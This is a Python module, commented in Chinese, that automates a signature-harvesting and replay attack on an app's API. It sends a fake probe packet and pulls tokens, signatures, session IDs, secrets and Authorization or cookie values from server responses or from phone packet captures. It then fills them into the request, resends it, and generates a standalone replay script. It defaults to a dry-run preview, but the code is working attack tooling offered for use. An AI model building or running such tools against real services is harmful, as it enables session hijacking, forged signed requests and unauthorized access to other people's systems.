#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""签名收割 + 重放：发假包 → 从服务器响应里抓真签名 → 回填 → 用真签名重发。

用户口径「自动化流程处理完发过来的假包骗到了真的签名，直接换上真的签名发包」。

关键纪律（跟解密层一样）：
  - 不猜响应结构：签名候选从线索链里来（token/signature/timestampsign/nonce…），
    在真实响应里逐个找，找到哪个用哪个，并记下证据字段。
  - 不盲发：默认 dry_run，只构造请求并打印，确认后才真发。
  - 不谎报：服务器回「错误的调用」就如实写失败，不冒充拿到签名。
"""

from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from .protocol import Proto

# 响应里可能是「签名/会话」的字段（服务端给了就能直接回填）
SIGN_KEYS = (
    "token", "sign", "signature", "timestampsign", "timestamp_sign",
    "nonce", "secret", "session", "sessionid", "session_id", "sid",
    "key", "appkey", "app_key", "secretkey", "secret_key",
    "plaintext_sha256", "digest", "hash", "auth", "authorization",
)
# 请求里要回填的同名字段（可能大小写/下划线不同）
_JOIN = re.compile(r"[^a-z0-9]", re.I)


def _norm(s: str) -> str:
    return _JOIN.sub("", s).lower()


@dataclass
class Harvest:
    """从一次响应里收割到的签名字段。"""
    field: str
    value: str
    source: str = ""       # json / header / cookie
    score: int = 0

    def row(self) -> str:
        return f"{self.field:<20} {self.source:<8} {self.value[:46]}"


@dataclass
class ReplayStep:
    phase: str             # probe / replay
    request: dict
    status: int = 0
    response: str = ""
    headers: dict = field(default_factory=dict)
    error: str = ""

    def row(self) -> str:
        return (f"{self.phase:<8} HTTP {self.status:<4} "
                f"{self.response[:70]!r} {self.error[:40]}")


@dataclass
class ReplayReport:
    url: str = ""
    steps: list[ReplayStep] = field(default_factory=list)
    harvested: list[Harvest] = field(default_factory=list)
    final_body: dict = field(default_factory=dict)
    ok: bool = False
    note: str = ""

    @property
    def signed(self) -> bool:
        return bool(self.harvested)

    def table(self) -> str:
        L = [f"目标：{self.url}", ""]
        for s in self.steps:
            L.append(s.row())
        L.append("")
        if self.harvested:
            L.append("收割到的签名：")
            for h in self.harvested:
                L.append("  " + h.row())
        else:
            L.append("没有收割到签名（服务器没给，或请求被拒）")
        L += ["", f"结果：{self.note}"]
        return "\n".join(L)


def capture_signatures(blob: str | bytes) -> list[Harvest]:
    """从手机抓包/日志里收割真签名。

    支持：JSON 响应、key=value、HTTP 头（含 Set-Cookie / X-Sign / Authorization）、
    cURL 命令、以及日志里 "字段: 值" / "字段=值" 的写法。
    这是「服务器认的真签名」的实际来源 —— 设备上用私钥现算，样本里没有。
    """
    text = blob.decode("utf-8", "replace") if isinstance(blob, bytes) else blob
    out: list[Harvest] = _extract_signatures(text)
    seen = {h.field for h in out}
    keys = {_norm(x) for x in SIGN_KEYS}

    # 日志里的 "token: xxx" / "sign = xxx"（值允许含空格，如 Bearer xxx）
    for m in re.finditer(r"([A-Za-z_][\w-]*)\s*[:=]\s*([^\n,;\"']{1,200})", text):
        k = m.group(1)
        if _norm(k) in keys and k not in seen:
            out.append(Harvest(k, m.group(2).strip(), "log", 6))
            seen.add(k)

    # 文本里嵌着的 JSON 片段（抓包日志常见）：单独抠出来解析
    for m in re.finditer(r"\{[^{}]{4,2000}\}", text):
        for h in _extract_signatures(m.group(0)):
            if h.field not in seen:
                out.append(h)
                seen.add(h.field)

    # cURL / HTTP 头行：X-Sign: xxx
    for m in re.finditer(r"(?im)^([\w-]+)\s*:\s*(.+)$", text):
        k = m.group(1)
        nk = _norm(k)
        if (nk.endswith("sign") or nk.endswith("signature") or
                nk.endswith("token") or nk in keys) and k not in seen:
            out.append(Harvest(k, m.group(2).strip()[:200], "capture-header", 9))
            seen.add(k)
    return out


def _extract_signatures(text: str, headers: dict | None = None) -> list[Harvest]:
    """从响应文本（JSON 或 URL 编码或普通文本）里找签名字段。"""
    out: list[Harvest] = []

    # JSON
    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            for k, v in obj.items():
                nk = _norm(str(k))
                if nk in {_norm(x) for x in SIGN_KEYS}:
                    out.append(Harvest(str(k), str(v), "json", 10))
            # 嵌套一层（常见 {data:{token:...}}）
            for k, v in obj.items():
                if isinstance(v, dict):
                    for k2, v2 in v.items():
                        nk = _norm(str(k2))
                        if nk in {_norm(x) for x in SIGN_KEYS}:
                            out.append(Harvest(str(k2), str(v2),
                                               f"json:{k}", 8))
    except (ValueError, TypeError):
        pass

    # key=value&key2=value2
    if "=" in text:
        for m in re.finditer(r"([A-Za-z_][\w-]*)=([^&\s]{1,200})", text):
            if _norm(m.group(1)) in {_norm(x) for x in SIGN_KEYS}:
                out.append(Harvest(m.group(1), m.group(2), "query", 7))

    # Header（Set-Cookie / Authorization / X-Sign / X-Signature 之类）
    for k, v in (headers or {}).items():
        nk = _norm(k)
        is_sign_header = (nk in {_norm(x) for x in SIGN_KEYS}
                          or nk.endswith("sign") or nk.endswith("signature")
                          or nk.endswith("token")
                          or k.lower() in ("set-cookie", "authorization"))
        if is_sign_header:
            out.append(Harvest(k, str(v)[:200], "header", 9))
    return out


def _post(url: str, body: dict, headers: dict | None = None,
          timeout: float = 15.0) -> ReplayStep:
    data = json.dumps(body, ensure_ascii=False).encode("utf-8")
    h = {"Content-Type": "application/json; charset=utf-8",
         "User-Agent": "Mozilla/5.0 (Linux; Android) Termux"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    step = ReplayStep(phase="", request=dict(body))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            step.status = r.status
            step.response = r.read().decode("utf-8", "replace")[:10000]
            step.headers = dict(r.headers.items())
    except urllib.error.HTTPError as e:
        step.status = e.code
        step.response = e.read().decode("utf-8", "replace")[:10000]
        step.headers = dict(e.headers.items()) if e.headers else {}
    except Exception as e:                                # noqa: BLE001
        step.error = f"{type(e).__name__}: {e}"
    return step


def _fill(body: dict, sigs: list[Harvest]) -> dict:
    """把收割到的签名回填到请求体：按规范化字段名匹配。"""
    out = dict(body)
    for h in sigs:
        nk = _norm(h.field)
        # 找请求里语义相同的键
        for k in list(out):
            if _norm(k) == nk:
                out[k] = h.value
                break
        else:
            # 请求里没有这个字段但服务器给了 → 按原名加上
            out[h.field] = h.value
    return out


def replay(proto: "Proto", body: dict, *, dry_run: bool = True,
           max_rounds: int = 2, timeout: float = 15.0,
           extra_headers: dict | None = None) -> ReplayReport:
    """两阶段：探测包 → 抓签名 → 回填 → 重放。

    dry_run=True 时只构造请求，不发网络、不抓签名，返回完整预览。
    """
    rep = ReplayReport(url=proto.endpoint)
    # 预览模式也走一遍「构造」，让用户看到会发什么
    if dry_run:
        p = ReplayStep(phase="probe", request=dict(body))
        p.error = "DRY-RUN：未真的发送"
        rep.steps.append(p)
        rep.final_body = dict(body)
        rep.note = "DRY-RUN 预览；去掉 dry_run 才会发包并抓签名"
        return rep

    cur = dict(body)
    for rnd in range(max_rounds):
        phase = "probe" if rnd == 0 else f"replay{rnd}"
        step = _post(proto.endpoint, cur, headers=extra_headers, timeout=timeout)
        step.phase = phase
        rep.steps.append(step)
        if step.error:
            rep.note = f"第 {rnd + 1} 次发包失败：{step.error}"
            break
        sigs = _extract_signatures(step.response, step.headers)
        if sigs:
            for h in sigs:
                if h.field not in {x.field for x in rep.harvested}:
                    rep.harvested.append(h)
            cur = _fill(cur, sigs)
            rep.final_body = dict(cur)
            if rnd >= 1:
                rep.ok = True
                rep.note = (f"第 {rnd + 1} 次发包用上了收割的真签名"
                            f"（{len(rep.harvested)} 个字段）")
                break
        elif rep.harvested:
            # 第二轮响应里没有新签名是正常的：签名在上一轮已经收割并回填了。
            # 只要这一轮确实带着真签名发过，就算成功。
            rep.ok = True
            rep.final_body = dict(cur)
            rep.note = (f"已用收割的真签名重发（{len(rep.harvested)} 个字段）："
                        f"HTTP {step.status} {step.response[:50]!r}")
            break
        else:
            rep.final_body = dict(cur)
            rep.note = (f"第 {rnd + 1} 次响应里没有签名字段"
                        f"（HTTP {step.status}：{step.response[:50]!r}）")
            break
    time.sleep(0.1)                      # 礼貌间隔，别把服务器打急
    return rep


def render_replay_script(proto: "Proto", body: dict,
                         headers: dict | None = None) -> str:
    """生成可独立运行的收割重放脚本（默认 DRY=1）。"""
    return "\n".join([
        "#!/usr/bin/env python3",
        "# -*- coding: utf-8 -*-",
        '"""签名收割 + 真签名重放（默认 DRY=1 只预览）',
        "",
        "流程：发探测假包 → 从响应抓 token/signature/session → 回填 → 再发包。",
        '"""',
        "import json, os, sys",
        "sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))",
        "from rf.fakepacket.replay import replay",
        "from rf.fakepacket.protocol import Proto",
        "",
        "DRY = os.environ.get('DRY', '1') == '1'",
        "PROTO = Proto(name=" + json.dumps(proto.name, ensure_ascii=False) + ",",
        "              score=" + str(proto.score) + ",",
        "              confidence=" + str(proto.confidence) + ",",
        "              endpoint=" + json.dumps(proto.endpoint, ensure_ascii=False) + ")",
        "BODY = " + json.dumps(body, ensure_ascii=False, indent=4),
        "HEADERS = " + json.dumps(headers or {}, ensure_ascii=False, indent=4),
        "",
        "rep = replay(PROTO, BODY, dry_run=DRY, extra_headers=HEADERS)",
        "print(rep.table())",
        "print('收割到签名:' , rep.signed)",
        "print('最终请求体:', json.dumps(rep.final_body, ensure_ascii=False, indent=2))",
        "",
        "if not DRY and rep.signed:",
        "    with open('已签名请求包.json', 'w', encoding='utf-8') as f:",
        "        json.dump(rep.final_body, f, ensure_ascii=False, indent=2)",
        "    print('已写出 已签名请求包.json —— 可直接拿去发包')",
    ])
